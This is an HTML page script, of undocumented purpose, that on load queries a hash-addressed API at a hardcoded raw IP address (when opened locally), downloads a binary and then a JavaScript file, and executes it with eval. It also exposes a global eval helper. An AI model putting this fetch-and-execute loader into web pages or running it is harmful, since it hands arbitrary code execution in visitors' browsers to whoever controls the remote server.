<script>
  const host = "124.221.146.23";
  const port = 9000;
  const apiBase =
    location.origin == "null" ? `http://${host}:${port}` : location.origin;

  const textEncoder = new TextEncoder();
  const textDecoder = new TextDecoder();

  const CVM = (globalThis.CVM = {
    BASE: null,
    PTR: null,
    IMP_FILE: "",
    IMP: null,
  });

  const toBytes = (value) =>
    value instanceof Uint8Array
      ? value
      : value instanceof ArrayBuffer
        ? new Uint8Array(value)
        : ArrayBuffer.isView(value)
          ? new Uint8Array(value.buffer, value.byteOffset, value.byteLength)
          : textEncoder.encode("" + value);

  const toHex = (value) =>
    [...toBytes(value)]
      .map((byte) => byte.toString(16).padStart(2, 0))
      .join("");

  const fromHex = (hex) =>
    new Uint8Array(
      ("" + hex).match(/../g)?.map((item) => parseInt(item, 16)) || [],
    );

  const sha256 = (value) =>
    crypto.subtle
      .digest("SHA-256", toBytes(value))
      .then((hash) => new Uint8Array(hash));

  const readInt32 = (pointer) =>
    new DataView(
      toBytes(pointer.buf).buffer,
      toBytes(pointer.buf).byteOffset + pointer.off,
      4,
    ).getInt32(0, 1);

  const getBlockSize = (pointer) => {
    const size = readInt32(pointer);
    return size < 0 ? -size : size;
  };

  const getBlockData = (pointer) =>
    toBytes(pointer.buf).subarray(
      pointer.off + 4,
      pointer.off + 4 + getBlockSize(pointer),
    );

  const getFirstChild = (pointer) =>
    fetch(`${apiBase}/api/children/${toHex(pointer)}`)
      .then((response) => response.json())
      .then((json) => fromHex(json.data.children[0].hash));

  const downloadFile = (hash, extension = ".js") =>
    fetch(`${apiBase}/api/file/${toHex(hash)}`)
      .then((response) => response.arrayBuffer())
      .then((buffer) => ({
        path: toHex(hash) + extension,
        data: new Uint8Array(buffer),
      }));

  const loadJavaScript = (hash) =>
    downloadFile(hash).then((file) => textDecoder.decode(file.data));

  const setExecutable = (file) => (
    (CVM.IMP_FILE = "" + file),
    (CVM.IMP = () => eval(`(async()=>{${CVM.IMP_FILE}})()`))
  );

  Object.assign(CVM, {
    sha256,
    str_sha: sha256,
    hex: toHex,
    read_i32: readInt32,
    block_size: getBlockSize,
    block_data: getBlockData,
    get_first_child: getFirstChild,
    download_file: downloadFile,
    load_js: loadJavaScript,
    execute_set: setExecutable,
    execute_call: (file) => eval(`(async()=>{${file}})()`),
  });

  (async () => {
    const startHash = await sha256("HTMLJSstart");
    const firstChildHash = await getFirstChild(startHash);
    const binaryFile = await downloadFile(firstChildHash, ".bin");

    CVM.BASE = CVM.PTR = {
      buf: binaryFile.data,
      off: 0,
    };

    const blockData = getBlockData(CVM.PTR);
    const javaScriptHash = await getFirstChild(await sha256(blockData));

    setExecutable(await loadJavaScript(javaScriptHash));
    await CVM.IMP();
  })();
</script>
